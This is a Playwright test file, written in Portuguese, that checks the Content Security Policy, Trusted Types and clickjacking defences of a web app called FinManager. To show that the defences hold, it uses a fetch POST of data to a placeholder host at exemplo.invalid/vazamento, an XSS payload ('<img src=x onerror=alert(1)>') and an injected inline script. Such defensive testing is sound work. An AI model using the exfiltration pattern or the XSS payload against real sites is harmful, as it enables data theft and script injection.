import { expect, test } from './fixtures';

test.describe('Content Security Policy (ENGENHARIA_DE_SOFTWARE §6.3)', () => {
  test('o app carrega sem nenhuma violação de CSP', async ({ page, monitor }) => {
    await page.goto('/');
    await expect(page.getByRole('banner')).toContainText('FinManager');
    await expect(page.getByRole('heading', { level: 1 })).toBeVisible();

    expect(await monitor.violacoesCsp()).toEqual([]);
  });

  test('não faz requisições para fora da origem do app (RN-011)', async ({ page, monitor }) => {
    await page.goto('/');
    await page.waitForLoadState('networkidle');

    expect(monitor.requisicoesExternas).toEqual([]);
  });

  test('bloqueia requisições de rede para outras origens', async ({ page, monitor }) => {
    await page.goto('/');

    const resultado = await page.evaluate(() =>
      fetch('https://exemplo.invalid/vazamento', { method: 'POST', body: 'dados' }).then(
        () => 'enviado',
        () => 'bloqueado',
      ),
    );

    expect(resultado).toBe('bloqueado');
    expect(await monitor.violacoesCsp()).toContainEqual(expect.stringMatching(/^connect-src/));
  });

  test('script-src não permite eval nem scripts inline', async ({ page }) => {
    // Não dá para testar eval via page.evaluate: o protocolo DevTools ignora essa
    // restrição da CSP. Por isso a política é verificada diretamente.
    await page.goto('/');
    const politica = await page
      .locator('meta[http-equiv="Content-Security-Policy"]')
      .getAttribute('content');
    const scriptSrc = politica
      ?.split(';')
      .map((d) => d.trim())
      .find((d) => d.startsWith('script-src '));

    expect(scriptSrc).toBe("script-src 'self' 'wasm-unsafe-eval'");
    expect(politica).toContain("connect-src 'self'");
    expect(politica).toContain("object-src 'none'");
  });

  test('scripts inline injetados na página não executam', async ({ page }) => {
    await page.goto('/');

    const inlineExecutou = await page.evaluate(() => {
      const w = window as unknown as { __inline?: boolean };
      try {
        const script = document.createElement('script');
        // Com Trusted Types, a própria atribuição já é bloqueada.
        script.textContent = 'window.__inline = true';
        document.body.append(script);
      } catch {
        // Bloqueado: é o comportamento esperado.
      }
      return w.__inline === true;
    });
    expect(inlineExecutou).toBe(false);
  });

  test('Trusted Types impede innerHTML com string comum', async ({ page }) => {
    await page.goto('/');

    const bloqueado = await page.evaluate(() => {
      try {
        document.body.innerHTML = '<img src=x onerror=alert(1)>';
        return false;
      } catch {
        return true;
      }
    });
    expect(bloqueado).toBe(true);
  });
});

test.describe('Proteção contra clickjacking (RNF-064)', () => {
  test('dentro de um iframe, o app não é inicializado e exibe um aviso', async ({
    page,
    baseURL,
  }) => {
    await page.setContent(`<iframe src="${baseURL}/" title="app embutido"></iframe>`);
    const frame = page.frameLocator('iframe');

    await expect(frame.getByRole('alert')).toContainText(
      'não pode ser aberto dentro de outra página',
    );
    await expect(frame.getByRole('link', { name: /nova aba/ })).toHaveAttribute('target', '_blank');
    await expect(frame.locator('app-root')).toHaveCount(0);
    await expect(frame.getByRole('banner')).toHaveCount(0);
  });
});
